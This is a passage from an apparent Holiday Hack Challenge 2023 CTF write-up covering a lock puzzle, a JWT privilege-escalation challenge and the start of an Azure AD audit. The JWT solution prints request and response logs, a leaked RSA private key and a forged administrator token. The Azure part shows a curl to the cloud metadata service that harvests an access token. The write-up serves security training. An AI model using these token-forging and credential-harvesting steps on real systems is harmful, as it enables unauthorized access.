if you can help open it!</p> Bow Ninecandle <p>Hey there! I'm Bow Ninecandle, and I've got a bit of a... 'pressing' situation. You can use <code>&lt;br/&gt;</code> to ensure each sentence starts on a new line.</p>"},{"location":"objectives/o17/#hints","title":"Hints","text":"Faster Lock tutorial <p>https://www.youtube.com/watch?v=27rE5ZvWLU0&amp;ab_channel=HelpfulLockPicker</p>"},{"location":"objectives/o17/#solution","title":"Solution","text":"<p>We have received hint to check talk on faster lock !</p> <p></p> <p>First we are looking for sticky number and later two guess numbers. These numbers will help us determine final combination.</p> <p>Step 1 we need to find Sticky number manipulating dial and putting little tension on a shackle. We need to keep moving clockwise until dial stops on a number.</p> <p>Step 2 Next we need to find 2 guess numbers which will lie between 0 and 11. The number is going to sit between the middle of two half numbers.</p> <p>Once we got all numbers we need to calculate our unlocking numbers, for this we use website: https://samy.pl/master/master.html</p> <p></p> <p>Once we have all numbers we need to try all of them to find the right combination.</p> <p>Standard instructions for combination lock: 1. Turn right three times. Stop at First Digit. 2. Turn left one full turn passing 1st number and stop at Second Digit. 3. Turn right and stop at Third Digit. Pull shackle. Profit.</p> <p>![Unlocked(../img/objectives/o17/unlocked.png)</p> <p>We could also just look into console for those numbers or to see if we are rotating numbers properly:</p> <pre><code>```\nvar first_set = false\nvar first_passed = false\nvar degrees_traversed = 0\nvar second_set = false\nvar third_set = false\n```\n</code></pre> <p></p>"},{"location":"objectives/o17/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Oh, thank heavens! You're a lifesaver! With your knack for cracking codes, we've just turned a potential 'loo catastrophe' into a holiday triumph!</p>"},{"location":"objectives/o18/","title":"The Captain's Comms","text":"<p>Difficulty:  Direct link: Objective Terminal</p>"},{"location":"objectives/o18/#objective","title":"Objective","text":"<p>Request</p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.s</p> Chimney Scissorsticks <p>You may have noticed some mischief-makers planning to stir up trouble ashore. They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR). The new SDR uses some fancy JWT technology to control access. The captain has a knack for shortening words, some sorta abbreviation trick. Not familiar with JWT values? No worries; just think of it as a clue-solving game. I've seen that the Captain likes to carry his journal with him wherever he goes. If only I could find the planned \"go-date\", \"go-time\", and radio frequency they plan to use. Remember, the captain's abbreviations are your guiding light through this mystery! Once we find a JWT value, these villains won't stand a chance. The closer we are, the sooner we'll be thwarting their pesky plans! We need to recreate an administrative JWT value to successfully transmit a message. Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p>"},{"location":"objectives/o18/#hints","title":"Hints","text":"Comms Journal <p>I've seen the Captain with his Journal visiting Pixel Island! </p> Comms JWT Intro <p>Along the way you will receive different hints. Insert them here.</p> Comms Private Key <p>Find a private key, update an existing JWT!.</p> Comms Web Interception Proxies <p>Web Interception proxies like Burp and Zap make web sites fun!</p> Comms Abbreviations <p>I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.</p>"},{"location":"objectives/o18/#solution","title":"Solution","text":"<p>Once we load Terminal we are presented with Transmitter and SDR.</p> <p></p> <p>To access Captain's SDR we need special authorization.</p> <p></p> <p>Looking in BURP at GET request we can see interesting Cookie</p> <p><pre><code>GET /checkRole HTTP/2\nHost: captainscomms.com\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjAwYTdkNGZhLWIxZGMtNGIyNi05NDM4LWY5NTVhMDI4Y2UxMSJ9.ZZBWmA.es4kQsCR6DUEYPytda-o3Zr9z84\nSec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\nSec-Ch-Ua-Mobile: ?0\nX-Request-Item: waterfall\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg\n</code></pre> JWT Decode: <pre><code>{\n    \"iss\": \"HHC 2023 Captain's Comms\",\n    \"iat\": 1699485795.3403327,\n    \"exp\": 1809937395.3403327,\n    \"aud\": \"Holiday Hack 2023\",\n    \"role\": \"radioUser\"\n}\n</code></pre></p> <p>Now we need to get radioMonitor role. Due to laziness of Captain as stated In Owner's card its in default installation path called /jwtDefault/</p> <p></p> <p>First TOKEN URL</p> <p>https://captainscomms.com/jwtDefault/rMonitor.tok</p> <p>It complains about \"Invalid authorization token provided.\" So we can inspect request and response in BURP.</p> <pre><code>## Request\n\nGET /jwtDefault/rMonitor.tok HTTP/2\nHost: captainscomms.com\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjJkZjllNWI1LTljMTktNGFhYy1hMzAyLTNjM2ExMjUwZTc3NSJ9.ZZBagg.JlVot9AAjTk9YpufWxvlr-PLF-k\nSec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg\n\n## RESPONSE\nHTTP/2 200 OK\nContent-Type: text/html; charset=utf-8\nVary: Accept-Encoding\nX-Cloud-Trace-Context: 73b54c716eff3ce3241d9f3346ec22fd;o=1\nDate: Sat, 30 Dec 2023 18:01:51 GMT\nServer: Google Frontend\nCache-Control: private\nContent-Length: 556\nVia: 1.1 google, 1.1 google\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\n\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg\n</code></pre> <p>rMonitor Token</p> <pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg\n</code></pre> <p>We can see interesting Token bearer as response. Now we should be able to access radio!</p> <p><pre><code>PAYLOAD:DATA\n\n{\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioMonitor\"\n}\n</code></pre> </p> <p>Next it complains about radioDecoder Role when trying to fetch radio frequency peaks.</p> <p></p> <p>Now using Monitor token we requested rDecoder token</p> <p>rDecoder Token</p> <p>https://captainscomms.com/jwtDefault/rDecoder.tok</p> <pre><code>## REQUEST\n\nGET /jwtDefault/rDecoder.tok HTTP/2\nHost: captainscomms.com\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjJkZjllNWI1LTljMTktNGFhYy1hMzAyLTNjM2ExMjUwZTc3NSJ9.ZZBagg.JlVot9AAjTk9YpufWxvlr-PLF-k\nSec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg\nUpgrade-Insecure-Requests: 1\n\n## RESPONSE\n\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg\n</code></pre> <p>rDecoder Token</p> <pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg\n</code></pre> <p>In this case we had to use</p> <p>With rDecoder token and modification of the request and justWatchThileRole Cookie with Token value from rDecoder Token we were able to obtain interesting files:</p> <p>Files to Decode</p> <p>https://captainscomms.com/static/images/dcdNUM.mp4 https://captainscomms.com/static/images/dcdFX.mp4 https://captainscomms.com/static/images/dcdCW.mp4 https://captainscomms.com/static/images/NothingToDecode.mp4</p> <p>CW Decoder: </p> <p></p> <p>Audio-Text Decoder:</p> <p></p> <p>FAX:</p> <p></p> <p>Each one revealed interesting piece of information.With information about captain's private key we will try to access it:</p> <p>Captain's private key</p> <p>https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key</p> <pre><code>## Request\n\nGET /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key HTTP/2\nHost: captainscomms.com\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjJkZjllNWI1LTljMTktNGFhYy1hMzAyLTNjM2ExMjUwZTc3NSJ9.ZZBagg.JlVot9AAjTk9YpufWxvlr-PLF-k\nSec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg\n\n## RESPONSE\n\nTTP/2 200 OK\nContent-Type: text/html; charset=utf-8\nVary: Accept-Encoding\nX-Cloud-Trace-Context: b52cadea8e41582b85af50b3f8b7004a;o=1\nDate: Sat, 30 Dec 2023 18:48:32 GMT\nServer: Google Frontend\nCache-Control: private\nContent-Length: 1704\nVia: 1.1 google, 1.1 google\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\n\n-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q\n5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb\ng0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB\nkuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4\nMaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd\nJyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay\n4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI\nadyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3\nVtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj\n9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R\nDCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP\n/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N\n/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9\n4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD\nonQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz\nYJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD\nYuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC\nVGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR\nwZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta\nbnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx\nNdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW\nWiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ\nY46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb\nkk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj\nxVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut\nUdQXV73mNwnYl0RQmBnDOl+i\n-----END PRIVATE KEY-----\n</code></pre> <p>Now we modify JWT Token to include new role to be able to access Radio Transmitter</p> <pre><code>{\n    \"iss\": \"HHC 2023 Captain's Comms\",\n    \"iat\": 1699485795.3403327,\n    \"exp\": 1809937395.3403327,\n    \"aud\": \"Holiday Hack 2023\",\n    \"role\": \"GeeseIslandsSuperChiefCommunicationsOfficer\"\n}\n</code></pre> <p>Signed GeeseIslandsSuperChiefCommunicationsOfficer JWT token</p> <pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng\n</code></pre> <p>After modyfing justwatchthisrole cookie i was able to access radio:</p> <p></p> <p>Once decoded all missing pieces of information we were able to sucesfully transmit via radio:</p> <p></p> <p>Answer</p> <p>10426:HZ, 1224L:MMDD, 1200:HHMM</p>"},{"location":"objectives/o18/#response","title":"Response","text":"<p>Chimney Scissorsticks</p> <p>Brilliant work! You've outsmarted those scoundrels with finesse!</p>"},{"location":"objectives/o19/","title":"Active Directory","text":"<p>Difficulty: </p>"},{"location":"objectives/o19/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p> Ribb Bonbowford <p>Hello, I'm Ribb Bonbowford. Nice to meet you! Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT. Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing. I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files. I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data. Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>"},{"location":"objectives/o19/#hints","title":"Hints","text":"Useful Tools <p>It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p> Misconfiguration ADventures <p>Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>"},{"location":"objectives/o19/#solution","title":"Solution","text":"<p>Reportinator tip</p> <p>Listing 4: Azure CLI Command to Set Key Vault Secret $ az keyvault secret set --vault-name vault-name --name secret-name --value secret-value A proper remediation should result in an error message, such as: AuthorizationFailed: The client client-id with object id object-id does not have authorization to perform action Microsoft.KeyVault/vaults/secrets/write over scope /subscriptions/subscription-id/resourceGroups/resource-group-name/providers/Microsoft.KeyVault/vaults/vault-name/secrets/secret-name or the scope is invalid.</p> <p>Once we gained access to Alabaster account We can see list of tools which might help us on auditing Azure AD enviroment.</p> <p>First we obtain token from Metadata service:</p> <pre><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s\n</code></pre> RESPONSE with TOKEN<pre><code>{\"access_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQxOTc1NjcsIm5iZiI6MTcwNDE5NzU2NywiZXhwIjoxNzA0Mjg0MjY3LCJhaW8iOiJFMlZnWU9ncjZKcjZJL3ZxWFRtMkI0cU1VclZiQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicm